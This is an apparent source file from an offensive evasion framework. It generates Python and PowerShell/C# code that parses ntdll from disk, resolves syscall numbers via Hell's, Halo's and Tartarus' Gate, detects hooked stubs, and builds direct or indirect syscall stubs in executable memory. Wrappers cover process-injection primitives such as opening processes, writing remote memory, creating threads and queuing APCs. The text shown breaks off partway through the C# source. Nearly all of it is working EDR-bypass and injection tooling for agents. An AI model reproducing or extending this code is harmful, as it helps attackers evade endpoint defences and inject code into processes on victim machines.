"""Direct and indirect syscall stub generation for Windows agents.

Generates a SyscallResolver class (Python/ctypes) or inline C# (PowerShell)
that parses ntdll from disk, resolves SSNs via Hell's/Halo's/Tartarus' Gate,
and builds callable stubs for wrapped NT functions.
"""

from __future__ import annotations

import random
import textwrap
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from evasion import EvasionConfig

# Gate techniques available for SSN resolution
GATE_TECHNIQUES = ("hells_gate", "halos_gate", "tartarus_gate")

# Syscalls we wrap with convenience functions
WRAPPED_SYSCALLS = (
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
    "NtOpenProcess",
    "NtQueueApcThread",
    "NtSetContextThread",
    "NtResumeThread",
    "NtWaitForSingleObject",
    "NtCreateSection",
    "NtMapViewOfSection",
)


def generate_code(lang: str, config: EvasionConfig) -> str:
    """Return syscall resolver code for the requested language."""
    if lang == "python":
        return _generate_python(config)
    if lang == "powershell":
        return _generate_powershell(config)
    return ""


def _pick_gate() -> str:
    """Select gate technique at generation time; default weight toward Tartarus."""
    return random.choice(["tartarus_gate", "tartarus_gate", "hells_gate", "halos_gate"])


def _generate_python(config: EvasionConfig) -> str:
    """Emit the full Python SyscallResolver with ctypes structures, SSN resolution, and wrappers."""

    mode = config.syscalls or "indirect"
    gate = _pick_gate()

    code = textwrap.dedent("""\
        import ctypes
        import ctypes.wintypes as wintypes
        import struct
        import os
        import sys

        # --- NT type definitions ---
        NTSTATUS = ctypes.c_long
        HANDLE = ctypes.c_void_p
        PVOID = ctypes.c_void_p
        ULONG = ctypes.c_ulong
        SIZE_T = ctypes.c_size_t
        PSIZE_T = ctypes.POINTER(ctypes.c_size_t)
        PULONG = ctypes.POINTER(ctypes.c_ulong)
        ULONG_PTR = ctypes.c_size_t
        ACCESS_MASK = ctypes.c_ulong
        BYTE = ctypes.c_ubyte
        USHORT = ctypes.c_ushort

        PAGE_EXECUTE_READWRITE = 0x40
        PAGE_READWRITE = 0x04
        PAGE_EXECUTE_READ = 0x20
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PROCESS_ALL_ACCESS = 0x001FFFFF
        SECTION_ALL_ACCESS = 0x000F001F
        SEC_COMMIT = 0x08000000
        THREAD_ALL_ACCESS = 0x001FFFFF
        STATUS_SUCCESS = 0

        kernel32 = ctypes.windll.kernel32

        class LARGE_INTEGER(ctypes.Structure):
            _fields_ = [("QuadPart", ctypes.c_longlong)]

        class UNICODE_STRING(ctypes.Structure):
            _fields_ = [
                ("Length", USHORT),
                ("MaximumLength", USHORT),
                ("Buffer", ctypes.c_wchar_p),
            ]

        class OBJECT_ATTRIBUTES(ctypes.Structure):
            _fields_ = [
                ("Length", ULONG),
                ("RootDirectory", HANDLE),
                ("ObjectName", ctypes.POINTER(UNICODE_STRING)),
                ("Attributes", ULONG),
                ("SecurityDescriptor", PVOID),
                ("SecurityQualityOfService", PVOID),
            ]

        class CLIENT_ID(ctypes.Structure):
            _fields_ = [
                ("UniqueProcess", HANDLE),
                ("UniqueThread", HANDLE),
            ]

        class IMAGE_DOS_HEADER(ctypes.Structure):
            _fields_ = [
                ("e_magic", USHORT),
                ("e_cblp", USHORT),
                ("e_cp", USHORT),
                ("e_crlc", USHORT),
                ("e_cparhdr", USHORT),
                ("e_minalloc", USHORT),
                ("e_maxalloc", USHORT),
                ("e_ss", USHORT),
                ("e_sp", USHORT),
                ("e_csum", USHORT),
                ("e_ip", USHORT),
                ("e_cs", USHORT),
                ("e_lfarlc", USHORT),
                ("e_ovno", USHORT),
                ("e_res", USHORT * 4),
                ("e_oemid", USHORT),
                ("e_oeminfo", USHORT),
                ("e_res2", USHORT * 10),
                ("e_lfanew", ctypes.c_long),
            ]

        class IMAGE_FILE_HEADER(ctypes.Structure):
            _fields_ = [
                ("Machine", USHORT),
                ("NumberOfSections", USHORT),
                ("TimeDateStamp", ULONG),
                ("PointerToSymbolTable", ULONG),
                ("NumberOfSymbols", ULONG),
                ("SizeOfOptionalHeader", USHORT),
                ("Characteristics", USHORT),
            ]

        class IMAGE_DATA_DIRECTORY(ctypes.Structure):
            _fields_ = [
                ("VirtualAddress", ULONG),
                ("Size", ULONG),
            ]

        class IMAGE_OPTIONAL_HEADER64(ctypes.Structure):
            _fields_ = [
                ("Magic", USHORT),
                ("MajorLinkerVersion", BYTE),
                ("MinorLinkerVersion", BYTE),
                ("SizeOfCode", ULONG),
                ("SizeOfInitializedData", ULONG),
                ("SizeOfUninitializedData", ULONG),
                ("AddressOfEntryPoint", ULONG),
                ("BaseOfCode", ULONG),
                ("ImageBase", ctypes.c_ulonglong),
                ("SectionAlignment", ULONG),
                ("FileAlignment", ULONG),
                ("MajorOperatingSystemVersion", USHORT),
                ("MinorOperatingSystemVersion", USHORT),
                ("MajorImageVersion", USHORT),
                ("MinorImageVersion", USHORT),
                ("MajorSubsystemVersion", USHORT),
                ("MinorSubsystemVersion", USHORT),
                ("Win32VersionValue", ULONG),
                ("SizeOfImage", ULONG),
                ("SizeOfHeaders", ULONG),
                ("CheckSum", ULONG),
                ("Subsystem", USHORT),
                ("DllCharacteristics", USHORT),
                ("SizeOfStackReserve", ctypes.c_ulonglong),
                ("SizeOfStackCommit", ctypes.c_ulonglong),
                ("SizeOfHeapReserve", ctypes.c_ulonglong),
                ("SizeOfHeapCommit", ctypes.c_ulonglong),
                ("LoaderFlags", ULONG),
                ("NumberOfRvaAndSizes", ULONG),
                ("DataDirectory", IMAGE_DATA_DIRECTORY * 16),
            ]

        class IMAGE_NT_HEADERS64(ctypes.Structure):
            _fields_ = [
                ("Signature", ULONG),
                ("FileHeader", IMAGE_FILE_HEADER),
                ("OptionalHeader", IMAGE_OPTIONAL_HEADER64),
            ]

        class IMAGE_EXPORT_DIRECTORY(ctypes.Structure):
            _fields_ = [
                ("Characteristics", ULONG),
                ("TimeDateStamp", ULONG),
                ("MajorVersion", USHORT),
                ("MinorVersion", USHORT),
                ("Name", ULONG),
                ("Base", ULONG),
                ("NumberOfFunctions", ULONG),
                ("NumberOfNames", ULONG),
                ("AddressOfFunctions", ULONG),
                ("AddressOfNames", ULONG),
                ("AddressOfNameOrdinals", ULONG),
            ]

        class IMAGE_SECTION_HEADER(ctypes.Structure):
            _fields_ = [
                ("Name", BYTE * 8),
                ("VirtualSize", ULONG),
                ("VirtualAddress", ULONG),
                ("SizeOfRawData", ULONG),
                ("PointerToRawData", ULONG),
                ("PointerToRelocations", ULONG),
                ("PointerToLinenumbers", ULONG),
                ("NumberOfRelocations", USHORT),
                ("NumberOfLinenumbers", USHORT),
                ("Characteristics", ULONG),
            ]


        def init_object_attributes():
            oa = OBJECT_ATTRIBUTES()
            oa.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
            oa.RootDirectory = None
            oa.ObjectName = None
            oa.Attributes = 0
            oa.SecurityDescriptor = None
            oa.SecurityQualityOfService = None
            return oa


        class SyscallResolver:
            GATE_TECHNIQUE = "{gate}"
            SYSCALL_MODE = "{mode}"

            def __init__(self):
                self.ntdll_data = None
                self.ssn_map = dict()
                self.stub_map = dict()
                self.gadget_addr = None
                self.text_base = 0
                self.text_size = 0
                self.target_functions = [
                    "NtAllocateVirtualMemory",
                    "NtProtectVirtualMemory",
                    "NtWriteVirtualMemory",
                    "NtCreateThreadEx",
                    "NtOpenProcess",
                    "NtQueueApcThread",
                    "NtSetContextThread",
                    "NtResumeThread",
                    "NtWaitForSingleObject",
                    "NtCreateSection",
                    "NtMapViewOfSection",
                ]
                self.func_rva_map = dict()
                self.sorted_stubs = []
                self.load_ntdll()
                self.parse_exports()
                self.resolve_all_ssns()
                if self.SYSCALL_MODE == "indirect":
                    self.find_syscall_gadget()
                self.build_all_stubs()

            def load_ntdll(self):
                ntdll_path = os.path.join(
                    os.environ.get("SYSTEMROOT", "C:\\\\Windows"),
                    "System32",
                    "ntdll.dll",
                )
                with open(ntdll_path, "rb") as fh:
                    self.ntdll_data = fh.read()

            def rva_to_offset(self, rva):
                dos = IMAGE_DOS_HEADER.from_buffer_copy(self.ntdll_data)
                nt_offset = dos.e_lfanew
                nt = IMAGE_NT_HEADERS64.from_buffer_copy(self.ntdll_data, nt_offset)
                section_offset = (
                    nt_offset
                    + 4
                    + ctypes.sizeof(IMAGE_FILE_HEADER)
                    + nt.FileHeader.SizeOfOptionalHeader
                )
                for idx in range(nt.FileHeader.NumberOfSections):
                    sec = IMAGE_SECTION_HEADER.from_buffer_copy(
                        self.ntdll_data,
                        section_offset + idx * ctypes.sizeof(IMAGE_SECTION_HEADER),
                    )
                    sec_start = sec.VirtualAddress
                    sec_end = sec_start + sec.VirtualSize
                    if sec_start <= rva < sec_end:
                        return rva - sec.VirtualAddress + sec.PointerToRawData
                return rva

            def parse_exports(self):
                dos = IMAGE_DOS_HEADER.from_buffer_copy(self.ntdll_data)
                nt = IMAGE_NT_HEADERS64.from_buffer_copy(self.ntdll_data, dos.e_lfanew)
                export_dir_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress
                if export_dir_rva == 0:
                    return
                export_offset = self.rva_to_offset(export_dir_rva)
                export_dir = IMAGE_EXPORT_DIRECTORY.from_buffer_copy(
                    self.ntdll_data, export_offset
                )
                names_offset = self.rva_to_offset(export_dir.AddressOfNames)
                ordinals_offset = self.rva_to_offset(export_dir.AddressOfNameOrdinals)
                funcs_offset = self.rva_to_offset(export_dir.AddressOfFunctions)

                # Also find the .text section bounds for gadget scanning
                section_offset = (
                    dos.e_lfanew
                    + 4
                    + ctypes.sizeof(IMAGE_FILE_HEADER)
                    + nt.FileHeader.SizeOfOptionalHeader
                )
                for idx in range(nt.FileHeader.NumberOfSections):
                    sec = IMAGE_SECTION_HEADER.from_buffer_copy(
                        self.ntdll_data,
                        section_offset + idx * ctypes.sizeof(IMAGE_SECTION_HEADER),
                    )
                    sec_name = bytes(sec.Name).rstrip(b"\\x00")
                    if sec_name == b".text":
                        self.text_base = sec.PointerToRawData
                        self.text_size = sec.SizeOfRawData
                        break

                all_stubs = []
                for i in range(export_dir.NumberOfNames):
                    name_rva = struct.unpack_from("<I", self.ntdll_data, names_offset + i * 4)[0]
                    name_off = self.rva_to_offset(name_rva)
                    end = self.ntdll_data.index(b"\\x00", name_off)
                    name = self.ntdll_data[name_off:end].decode("ascii", errors="ignore")
                    ordinal = struct.unpack_from("<H", self.ntdll_data, ordinals_offset + i * 2)[0]
                    func_rva = struct.unpack_from("<I", self.ntdll_data, funcs_offset + ordinal * 4)[0]
                    if name.startswith("Nt") or name.startswith("Zw"):
                        func_offset = self.rva_to_offset(func_rva)
                        all_stubs.append((name, func_rva, func_offset))
                        if name in self.target_functions:
                            self.func_rva_map[name] = (func_rva, func_offset)

                # Sort all Nt/Zw stubs by RVA to establish SSN ordering
                all_stubs.sort(key=lambda x: x[1])
                self.sorted_stubs = all_stubs

            def hells_gate_read(self, offset):
                chunk = self.ntdll_data[offset : offset + 24]
                if len(chunk) < 8:
                    return None
                # mov r10, rcx => 4c 8b d1
                # mov eax, SSN => b8 XX XX 00 00
                if chunk[0:3] == b"\\x4c\\x8b\\xd1" and chunk[3] == 0xB8:
                    ssn = struct.unpack_from("<H", chunk, 4)[0]
                    return ssn
                # Alternative: some Windows builds put mov r10,rcx at +3
                if chunk[0] == 0xB8:
                    ssn = struct.unpack_from("<H", chunk, 1)[0]
                    if chunk[3:6] == b"\\x00\\x00\\x4c" and chunk[5:8] == b"\\x4c\\x8b\\xd1":
                        return ssn
                return None

            def is_hooked(self, offset):
                chunk = self.ntdll_data[offset : offset + 4]
                if len(chunk) < 4:
                    return True
                # A clean stub starts with 4c 8b d1 b8 (mov r10,rcx; mov eax,...)
                if chunk[0:3] == b"\\x4c\\x8b\\xd1" and chunk[3] == 0xB8:
                    return False
                return True

            def halos_gate_resolve(self, target_name):
                target_info = self.func_rva_map.get(target_name)
                if target_info is None:
                    return None
                target_rva = target_info[0]
                # Find index in sorted stubs
                target_idx = None
                for idx, (name, rva, off) in enumerate(self.sorted_stubs):
                    if name == target_name:
                        target_idx = idx
                        break
                if target_idx is None:
                    return None
                # Walk neighbors up and down
                for distance in range(1, 64):
                    # Check upward neighbor
                    up_idx = target_idx - distance
                    if up_idx >= 0:
                        neighbor_name, neighbor_rva, neighbor_off = self.sorted_stubs[up_idx]
                        ssn = self.hells_gate_read(neighbor_off)
                        if ssn is not None:
                            return ssn + distance
                    # Check downward neighbor
                    down_idx = target_idx + distance
                    if down_idx < len(self.sorted_stubs):
                        neighbor_name, neighbor_rva, neighbor_off = self.sorted_stubs[down_idx]
                        ssn = self.hells_gate_read(neighbor_off)
                        if ssn is not None:
                            return ssn - distance
                return None

            def resolve_ssn(self, func_name):
                info = self.func_rva_map.get(func_name)
                if info is None:
                    return None
                func_rva, func_offset = info

                if self.GATE_TECHNIQUE == "hells_gate":
                    return self.hells_gate_read(func_offset)

                if self.GATE_TECHNIQUE == "halos_gate":
                    return self.halos_gate_resolve(func_name)

                # tartarus_gate: try Hell's Gate first, fall back to Halo's Gate
                ssn = self.hells_gate_read(func_offset)
                if ssn is not None:
                    return ssn
                return self.halos_gate_resolve(func_name)

            def resolve_all_ssns(self):
                for func_name in self.target_functions:
                    ssn = self.resolve_ssn(func_name)
                    if ssn is not None:
                        self.ssn_map[func_name] = ssn

            def find_syscall_gadget(self):
                # Scan ntdll .text section for syscall;ret (0F 05 C3)
                gadget_bytes = b"\\x0f\\x05\\xc3"
                text_data = self.ntdll_data[self.text_base : self.text_base + self.text_size]
                pos = text_data.find(gadget_bytes)
                if pos >= 0:
                    # Need runtime address: get ntdll base in memory
                    ntdll_handle = kernel32.GetModuleHandleW("ntdll.dll")
                    # Convert file offset back to RVA for the loaded module
                    dos = IMAGE_DOS_HEADER.from_buffer_copy(self.ntdll_data)
                    nt = IMAGE_NT_HEADERS64.from_buffer_copy(self.ntdll_data, dos.e_lfanew)
                    sec_off = (
                        dos.e_lfanew
                        + 4
                        + ctypes.sizeof(IMAGE_FILE_HEADER)
                        + nt.FileHeader.SizeOfOptionalHeader
                    )
                    for idx in range(nt.FileHeader.NumberOfSections):
                        sec = IMAGE_SECTION_HEADER.from_buffer_copy(
                            self.ntdll_data,
                            sec_off + idx * ctypes.sizeof(IMAGE_SECTION_HEADER),
                        )
                        sec_name = bytes(sec.Name).rstrip(b"\\x00")
                        if sec_name == b".text":
                            gadget_rva = sec.VirtualAddress + pos
                            self.gadget_addr = ntdll_handle + gadget_rva
                            break

            def build_stub(self, func_name):
                ssn = self.ssn_map.get(func_name)
                if ssn is None:
                    return None

                if self.SYSCALL_MODE == "indirect":
                    if self.gadget_addr is None:
                        return None
                    # mov r10, rcx  => 4C 8B D1
                    # mov eax, SSN  => B8 XX XX 00 00
                    # jmp gadget    => FF 25 00 00 00 00 [8-byte addr]
                    stub_bytes = bytearray()
                    stub_bytes += b"\\x4c\\x8b\\xd1"
                    stub_bytes += b"\\xb8" + struct.pack("<I", ssn)
                    stub_bytes += b"\\xff\\x25\\x00\\x00\\x00\\x00"
                    stub_bytes += struct.pack("<Q", self.gadget_addr)
                    return bytes(stub_bytes)
                else:
                    # Direct: mov r10,rcx; mov eax,SSN; syscall; ret
                    stub_bytes = bytearray()
                    stub_bytes += b"\\x4c\\x8b\\xd1"
                    stub_bytes += b"\\xb8" + struct.pack("<I", ssn)
                    stub_bytes += b"\\x0f\\x05"
                    stub_bytes += b"\\xc3"
                    return bytes(stub_bytes)

            def build_all_stubs(self):
                for func_name in self.target_functions:
                    stub = self.build_stub(func_name)
                    if stub is None:
                        continue
                    stub_len = len(stub)
                    buf = ctypes.c_char_p(stub)
                    mem = kernel32.VirtualAlloc(
                        None, stub_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
                    )
                    if mem:
                        ctypes.memmove(mem, buf, stub_len)
                        self.stub_map[func_name] = mem

            def get_callable(self, func_name, restype, argtypes):
                addr = self.stub_map.get(func_name)
                if addr is None:
                    return None
                proto = ctypes.CFUNCTYPE(restype, *argtypes, use_errno=True)
                return proto(addr)


        # --- Module-level resolver instance and convenience wrappers ---

        resolver = SyscallResolver()


        def syscall_alloc(process_handle, base_addr, size, alloc_type, protect):
            fn = resolver.get_callable(
                "NtAllocateVirtualMemory",
                NTSTATUS,
                [HANDLE, ctypes.POINTER(PVOID), ULONG_PTR, PSIZE_T, ULONG, ULONG],
            )
            if fn is None:
                return -1
            base = PVOID(base_addr)
            region_size = SIZE_T(size)
            status = fn(
                process_handle,
                ctypes.byref(base),
                0,
                ctypes.byref(region_size),
                alloc_type,
                protect,
            )
            return status, base.value


        def syscall_protect(process_handle, base_addr, size, new_protect):
            fn = resolver.get_callable(
                "NtProtectVirtualMemory",
                NTSTATUS,
                [HANDLE, ctypes.POINTER(PVOID), PSIZE_T, ULONG, PULONG],
            )
            if fn is None:
                return -1, 0
            base = PVOID(base_addr)
            region_size = SIZE_T(size)
            old_protect = ULONG(0)
            status = fn(
                process_handle,
                ctypes.byref(base),
                ctypes.byref(region_size),
                new_protect,
                ctypes.byref(old_protect),
            )
            return status, old_protect.value


        def syscall_write(process_handle, base_addr, buffer, size):
            fn = resolver.get_callable(
                "NtWriteVirtualMemory",
                NTSTATUS,
                [HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T],
            )
            if fn is None:
                return -1
            bytes_written = SIZE_T(0)
            status = fn(
                process_handle,
                base_addr,
                buffer,
                size,
                ctypes.byref(bytes_written),
            )
            return status


        def syscall_create_thread(process_handle, start_addr, parameter):
            fn = resolver.get_callable(
                "NtCreateThreadEx",
                NTSTATUS,
                [
                    ctypes.POINTER(HANDLE),
                    ACCESS_MASK,
                    PVOID,
                    HANDLE,
                    PVOID,
                    PVOID,
                    ULONG,
                    SIZE_T,
                    SIZE_T,
                    SIZE_T,
                    PVOID,
                ],
            )
            if fn is None:
                return -1, None
            thread_handle = HANDLE(0)
            status = fn(
                ctypes.byref(thread_handle),
                THREAD_ALL_ACCESS,
                None,
                process_handle,
                start_addr,
                parameter,
                0,
                0,
                0,
                0,
                None,
            )
            return status, thread_handle.value


        def syscall_open_process(pid, access):
            fn = resolver.get_callable(
                "NtOpenProcess",
                NTSTATUS,
                [ctypes.POINTER(HANDLE), ACCESS_MASK, ctypes.POINTER(OBJECT_ATTRIBUTES), ctypes.POINTER(CLIENT_ID)],
            )
            if fn is None:
                return -1, None
            proc_handle = HANDLE(0)
            oa = init_object_attributes()
            cid = CLIENT_ID()
            cid.UniqueProcess = pid
            cid.UniqueThread = 0
            status = fn(
                ctypes.byref(proc_handle),
                access,
                ctypes.byref(oa),
                ctypes.byref(cid),
            )
            return status, proc_handle.value


        def syscall_queue_apc(thread_handle, apc_routine, arg):
            fn = resolver.get_callable(
                "NtQueueApcThread",
                NTSTATUS,
                [HANDLE, PVOID, PVOID, PVOID, PVOID],
            )
            if fn is None:
                return -1
            return fn(thread_handle, apc_routine, arg, None, None)


        def syscall_set_context(thread_handle, context):
            fn = resolver.get_callable(
                "NtSetContextThread",
                NTSTATUS,
                [HANDLE, PVOID],
            )
            if fn is None:
                return -1
            return fn(thread_handle, context)


        def syscall_resume_thread(thread_handle):
            fn = resolver.get_callable(
                "NtResumeThread",
                NTSTATUS,
                [HANDLE, PULONG],
            )
            if fn is None:
                return -1
            suspend_count = ULONG(0)
            status = fn(thread_handle, ctypes.byref(suspend_count))
            return status


        def syscall_wait(handle, timeout_ms):
            fn = resolver.get_callable(
                "NtWaitForSingleObject",
                NTSTATUS,
                [HANDLE, ctypes.c_ubyte, ctypes.POINTER(LARGE_INTEGER)],
            )
            if fn is None:
                return -1
            if timeout_ms is None:
                status = fn(handle, 0, None)
            else:
                li = LARGE_INTEGER()
                li.QuadPart = -(timeout_ms * 10000)
                status = fn(handle, 0, ctypes.byref(li))
            return status


        def syscall_create_section(desired_access, section_size, protect, attributes):
            fn = resolver.get_callable(
                "NtCreateSection",
                NTSTATUS,
                [
                    ctypes.POINTER(HANDLE),
                    ACCESS_MASK,
                    ctypes.POINTER(OBJECT_ATTRIBUTES),
                    ctypes.POINTER(LARGE_INTEGER),
                    ULONG,
                    ULONG,
                    HANDLE,
                ],
            )
            if fn is None:
                return -1, None
            section_handle = HANDLE(0)
            max_size = LARGE_INTEGER()
            max_size.QuadPart = section_size
            oa = init_object_attributes()
            status = fn(
                ctypes.byref(section_handle),
                desired_access,
                ctypes.byref(oa),
                ctypes.byref(max_size),
                protect,
                attributes,
                None,
            )
            return status, section_handle.value


        def syscall_map_view(section_handle, process_handle, size, protect, commit_size=0, section_offset=0):
            fn = resolver.get_callable(
                "NtMapViewOfSection",
                NTSTATUS,
                [
                    HANDLE,
                    HANDLE,
                    ctypes.POINTER(PVOID),
                    ULONG_PTR,
                    SIZE_T,
                    ctypes.POINTER(LARGE_INTEGER),
                    PSIZE_T,
                    ULONG,
                    ULONG,
                    ULONG,
                ],
            )
            if fn is None:
                return -1, None
            base = PVOID(0)
            view_size = SIZE_T(size)
            offset = LARGE_INTEGER()
            offset.QuadPart = section_offset
            status = fn(
                section_handle,
                process_handle,
                ctypes.byref(base),
                0,
                commit_size,
                ctypes.byref(offset),
                ctypes.byref(view_size),
                2,
                0,
                protect,
            )
            return status, base.value
    """).format(gate=gate, mode=mode)

    return code


def _generate_powershell(config: EvasionConfig) -> str:
    """Emit PowerShell inline C# via Add-Type with syscall resolver."""

    mode = config.syscalls or "indirect"
    gate = _pick_gate()

    # Build the C# source that gets compiled at runtime
    csharp_source = _build_csharp_source(gate, mode)

    # Wrap in PowerShell Add-Type
    code = textwrap.dedent("""\
        $syscall_src = @"
        {csharp}
        "@

        Add-Type -TypeDefinition $syscall_src -Language CSharp
        $syscall_resolver = New-Object SyscallEngine.SyscallResolver
        $syscall_resolver.Init()

        function Invoke-SyscallAlloc {{
            param([IntPtr]$ProcessHandle, [IntPtr]$BaseAddr, [UInt64]$Size, [UInt32]$AllocType, [UInt32]$Protect)
            return [SyscallEngine.SyscallWrappers]::SyscallAlloc($ProcessHandle, $BaseAddr, $Size, $AllocType, $Protect)
        }}

        function Invoke-SyscallProtect {{
            param([IntPtr]$ProcessHandle, [IntPtr]$BaseAddr, [UInt64]$Size, [UInt32]$NewProtect)
            return [SyscallEngine.SyscallWrappers]::SyscallProtect($ProcessHandle, $BaseAddr, $Size, $NewProtect)
        }}

        function Invoke-SyscallWrite {{
            param([IntPtr]$ProcessHandle, [IntPtr]$BaseAddr, [byte[]]$Buffer)
            return [SyscallEngine.SyscallWrappers]::SyscallWrite($ProcessHandle, $BaseAddr, $Buffer)
        }}

        function Invoke-SyscallCreateThread {{
            param([IntPtr]$ProcessHandle, [IntPtr]$StartAddr, [IntPtr]$Parameter)
            return [SyscallEngine.SyscallWrappers]::SyscallCreateThread($ProcessHandle, $StartAddr, $Parameter)
        }}

        function Invoke-SyscallOpenProcess {{
            param([UInt32]$Pid, [UInt32]$Access)
            return [SyscallEngine.SyscallWrappers]::SyscallOpenProcess($Pid, $Access)
        }}

        function Invoke-SyscallQueueApc {{
            param([IntPtr]$ThreadHandle, [IntPtr]$ApcRoutine, [IntPtr]$Arg)
            return [SyscallEngine.SyscallWrappers]::SyscallQueueApc($ThreadHandle, $ApcRoutine, $Arg)
        }}

        function Invoke-SyscallSetContext {{
            param([IntPtr]$ThreadHandle, [IntPtr]$Context)
            return [SyscallEngine.SyscallWrappers]::SyscallSetContext($ThreadHandle, $Context)
        }}

        function Invoke-SyscallResumeThread {{
            param([IntPtr]$ThreadHandle)
            return [SyscallEngine.SyscallWrappers]::SyscallResumeThread($ThreadHandle)
        }}

        function Invoke-SyscallWait {{
            param([IntPtr]$Handle, [Nullable[Int32]]$TimeoutMs)
            return [SyscallEngine.SyscallWrappers]::SyscallWait($Handle, $TimeoutMs)
        }}

        function Invoke-SyscallCreateSection {{
            param([UInt32]$Access, [Int64]$Size, [UInt32]$Protect, [UInt32]$Attributes)
            return [SyscallEngine.SyscallWrappers]::SyscallCreateSection($Access, $Size, $Protect, $Attributes)
        }}

        function Invoke-SyscallMapView {{
            param([IntPtr]$SectionHandle, [IntPtr]$ProcessHandle, [UInt64]$Size, [UInt32]$Protect)
            return [SyscallEngine.SyscallWrappers]::SyscallMapView($SectionHandle, $ProcessHandle, $Size, $Protect)
        }}
    """).format(csharp=csharp_source)

    return code


def _build_csharp_source(gate: str, mode: str) -> str:
    """Build the C# source for the PowerShell Add-Type syscall resolver."""

    gate_csharp = {
        "hells_gate": "HellsGate",
        "halos_gate": "HalosGate",
        "tartarus_gate": "TartarusGate",
    }[gate]

    mode_flag = "true" if mode == "indirect" else "false"

    return textwrap.dedent("""\
        using System;
        using System.IO;
        using System.Runtime.InteropServices;

        namespace SyscallEngine
        {{
            public enum GateTechnique {{ HellsGate, HalosGate, TartarusGate }}

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_DOS_HEADER
            {{
                public ushort e_magic;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 29)]
                public ushort[] e_padding;
                public int e_lfanew;
            }}

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_FILE_HEADER
            {{
                public ushort Machine;
                public ushort NumberOfSections;
                public uint TimeDateStamp;
                public uint PointerToSymbolTable;
                public uint NumberOfSymbols;
                public ushort SizeOfOptionalHeader;
                public ushort Characteristics;
            }}

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_DATA_DIRECTORY
            {{
                public uint VirtualAddress;
                public uint Size;
            }}

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_OPTIONAL_HEADER64
            {{
                public ushort Magic;
                public byte MajorLinkerVersion;
                public byte MinorLinkerVersion;
                public uint SizeOfCode;
                public uint SizeOfInitializedData;
                public uint SizeOfUninitializedData;
                public uint AddressOfEntryPoint;
                public uint BaseOfCode;
                public ulong ImageBase;
                public uint SectionAlignment;
                public uint FileAlignment;
                public ushort MajorOperatingSystemVersion;
                public ushort MinorOperatingSystemVersion;
                public ushort MajorImageVersion;
                public ushort MinorImageVersion;
                public ushort MajorSubsystemVersion;
                public ushort MinorSubsystemVersion;
                public uint Win32VersionValue;
                public uint SizeOfImage;
                public uint SizeOfHeaders;
                public uint CheckSum;
                public ushort Subsystem;
                public ushort DllCharacteristics;
                public ulong SizeOfStackReserve;
                public ulong SizeOfStackCommit;
                public ulong SizeOfHeapReserve;
                public ulong SizeOfHeapCommit;
                public uint LoaderFlags;
                public uint NumberOfRvaAndSizes;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
                public IMAGE_DATA_DIRECTORY[] DataDirectory;
            }}

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_EXPORT_DIRECTORY
            {{
                public uint Characteristics;
                public uint TimeDateStamp;
                public ushort MajorVersion;
                public ushort MinorVersion;
                public uint Name;
                public uint Base;
                public uint NumberOfFunctions;
                public uint NumberOfNames;
                public uint AddressOfFunctions;
                public uint AddressOfNames;
                public uint AddressOfNameOrdinals;
            }}

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_SECTION_HEADER
            {{
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
                public byte[] Name;
                public uint VirtualSize;
                public uint VirtualAddress;
                public uint SizeOfRawData;
                public uint PointerToRawData;
                public uint PointerToRelocations;
                public uint PointerToLinenumbers;
                public ushort NumberOfRelocations;
                public ushort NumberOfLinenumbers;
                public uint Characteristics;
            }}

            public struct SyscallEntry
            {{
                public string Name;
                public uint Rva;
                public int FileOffset;
                public int Ssn;
            }}

            public struct SyscallResult
            {{
                public int Status;
                public IntPtr Value;
            }}

            public class SyscallResolver
            {{
                [DllImport("kernel32.dll")]
                static extern IntPtr GetModuleHandle(string lpModuleName);

                [DllImport("kernel32.dll")]
                static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

                [DllImport("kernel32.dll")]
                static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

                private const uint MEM_COMMIT = 0x1000;
                private const uint MEM_RESERVE = 0x2000;
                private const uint PAGE_EXECUTE_READWRITE = 0x40;

                private byte[] ntdllData;
                private System.Collections.Generic.Dictionary<string, int> ssnMap;
                private System.Collections.Generic.Dictionary<string, IntPtr> stubMap;
                private System.Collections.Generic.List<SyscallEntry> sortedStubs;
                private IntPtr gadgetAddr;
                private int textBase;
                private int textSize;
                private GateTechnique gateTechnique;
                private bool indirectMode;

                private static readonly string[] targetFunctions = new string[] {{
                    "NtAllocateVirtualMemory",
                    "NtProtectVirtualMemory",
                    "NtWriteVirtualMemory",
                    "NtCreateThreadEx",
                    "NtOpenProcess",
                    "NtQueueApcThread",
                    "NtSetContextThread",
                    "NtResumeThread",
                    "NtWaitForSingleObject",
                    "NtCreateSection",
                    "NtMapViewOfSection",
                }};

                public SyscallResolver()
                {{
                    ssnMap = new System.Collections.Generic.Dictionary<string, int>();
                    stubMap = new System.Collections.Generic.Dictionary<string, IntPtr>();
                    sortedStubs = new System.Collections.Generic.List<SyscallEntry>();
                    gadgetAddr = IntPtr.Zero;
                    gateTechnique = GateTechnique.{gate_technique};
                    indirectMode = {indirect_mode};
                }}

                public void Init()
                {{
                    LoadNtdll();
                    ParseExports();
                    ResolveAllSsns();
                    if (indirectMode)
                        FindSyscallGadget();
                    BuildAllStubs();
                }}

                private void LoadNtdll()
                {{
                    string sysRoot = Environment.GetEnvironmentVariable("SYSTEMROOT") ?? @"C:\\Windows";
                    string path = Path.Combine(sysRoot, "System32", "ntdll.dll");
                    ntdllData = File.ReadAllBytes(path);
                }}

                private int RvaToOffset(uint rva)
                {{
                    int lfanew = BitConverter.ToInt32(ntdllData, 60);
